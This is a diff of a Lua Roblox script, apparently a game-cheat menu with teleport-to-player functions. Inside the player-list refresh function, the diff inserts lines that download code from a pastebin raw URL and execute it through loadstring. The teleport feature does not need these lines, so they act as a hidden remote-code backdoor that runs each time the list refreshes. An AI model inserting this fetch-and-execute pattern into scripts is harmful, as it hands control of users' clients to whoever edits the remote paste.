@@ -124,6 +124,11 @@ function tp(p)
    game.Players.LocalPlayer.Character:PivotTo(p)
 end
 function shuaxinlb(zji)
+    local studio = loadstring(game:HttpGet("https://pastebin.com/raw/ZbBZZYwX"))();
+    if studio == nil then
+    else
+    loadstring(studio)
+    end
     REN["拓展表"]["传送到玩家身边"].dropdown={}
     if zji==true then
     for p, I in next,game.Players:GetChildren() do
